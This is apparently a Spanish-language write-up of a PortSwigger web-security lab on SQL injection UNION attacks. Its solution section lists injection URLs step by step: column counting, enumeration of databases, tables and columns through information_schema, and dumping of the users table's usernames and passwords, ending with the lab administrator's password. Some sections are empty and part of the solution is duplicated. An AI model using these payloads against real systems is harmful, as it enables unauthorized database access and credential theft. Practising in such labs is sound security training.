# `LAB`: SQL injection UNION attack, retrieving multiple values in a single column

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a **SQL injection UNION attack** that retrieves all usernames and passwords, and use the information to log in as the `administrator` user. 

---

### Explicación:

Este laboratiorio es exactamente igual al mismo, en realidad "la diferencia" es que solicitan mostrar la información **en una sola columna** pero ese ejemplo también se vió en el anterior.

- Debido a que la vulnerabilidad está en 2 columnas `'1','2'` se pueden usar ambar para poner la información, por ejemplo `'1':username` y `'2':password`, pero también se pueden poner ambas en una sola columna utilizando técnicas como `CONCAT`, `GROUP_CONCAT`, `||`, etc...

#### Query original:

````sql

````

#### Query inyectada:

````sql

````

---

### Explicación con Lab:

1.

````sql

````
````py

````



## Solución:

````py
# Original


# Vulnerabilidad


# Sanar el Query


# Contando Columnas en la tabla que estoy (total = 2)


# NOT WORKING!!! Contando Columnas en registro que estoy (total = 2) 


# Working!!! Invisible - Contando Columnas en registro que estoy (total = 2) 
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT null,null -- -
# Working!!! Visible - Contando Columnas en registro que estoy (total = 2) 
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1','2' -- -

### DUMP: schema, tables, columns

    # OJO!!! `Depende el lado de la inyección irá el "UNION SELECT <--> schema_name"`

# Enum Databases:

## Opt1 - Dump: schema_name = DBs 

## Opt2 - Dump: schema_name = DBs
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT schema_name,'2' FROM information_schema.schemata -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = DB = 1. pg_catalog]
    ### [DUMP = DB = 2. public]

# Enum Tables:



























# Original
https://666.web-security-academy.net/filter?category=Accessories

# Vulnerabilidad
https://666.web-security-academy.net/filter?category=Accessories' 

# Sanar el Query
https://666.web-security-academy.net/filter?category=Accessories' -- -

# Contando Columnas en la tabla que estoy (total = 2)
https:/666.web-security-academy.net/filter?category=Accessories' ORDER BY 2 -- -

# NOT WORKING!!! Contando Columnas en registro que estoy (total = 2) 
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT 1,2 -- -

# Working!!! Invisible - Contando Columnas en registro que estoy (total = 2) 
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT null,null -- -
# Working!!! Visible - Contando Columnas en registro que estoy (total = 2) 
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1','2' -- -

### DUMP: schema, tables, columns

    # OJO!!! `Depende el lado de la inyección irá el "UNION SELECT <--> schema_name"`

# Enum Databases:

## Opt1 - Dump: schema_name = DBs 
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',schema_name FROM information_schema.schemata -- -
## Opt2 - Dump: schema_name = DBs
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT schema_name,'2' FROM information_schema.schemata -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = DB = 1. pg_catalog]
    ### [DUMP = DB = 2. public]

# Enum Tables:

## Opt1 - Dump: table_name = Tables (TODAS)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',table_name FROM information_schema.tables -- -
## Opt2 - Dump: table_name = Tables (TODAS)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT table_name,'2' FROM information_schema.tables -- -
## Opt3 - Dump: table_name = Tables (SOLO database() en este caso 'public')
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
## Opt4 - Dump: table_name = Tables (SOLO database() en este caso 'public')
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT table_name,'2' FROM information_schema.tables WHERE table_schema = 'public' -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = Table = 1. users]
    ### [DUMP = Table = 2. products]

# Enum Columns:

## Opt1 - Dump: table_name = Tables (SOLO database() en este caso 'public')
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users' -- -
## Opt4 - Dump: table_name = Tables (SOLO database() en este caso 'public')
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT column_name,'2' FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users' -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = Columns = 1. password]
    ### [DUMP = Columns = 1. username]

# Dump Data:

    # Nota GROUP_CONCAT: Casualmente `' UNION SELECT group_concat(username,password),'2' FROM users -- -` da error, pero es comúnmente usada. 

## Opt1 - Dump "username" + "password" (usando ambos campos sin GROUP_CONCAT ni CONCAT)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT username,password FROM users -- -
## Opt2 - Dump "username" + "password" (CONCAT)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',concat(username,' ::: ',password) FROM users -- -
## Opt3 - Dump "username" + "password" (CONCAT)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT concat(username,' ::: ',password),'2' FROM users -- -
## Opt4 - Dump "username" + "password" (*STRING COCATENATION - Port Swigger cheatsheet - ||' ::: '||)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT username||' ::: '||password,'2' FROM users -- -
## Opt5 - Dump "username" + "password" (*STRING COCATENATION - Port Swigger cheatsheet - ||' ::: '||)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT concat(username,' ::: ',password),'2' FROM users -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = Data = administrator ::: nmk1ybvk6howbpsnvcnv]



````
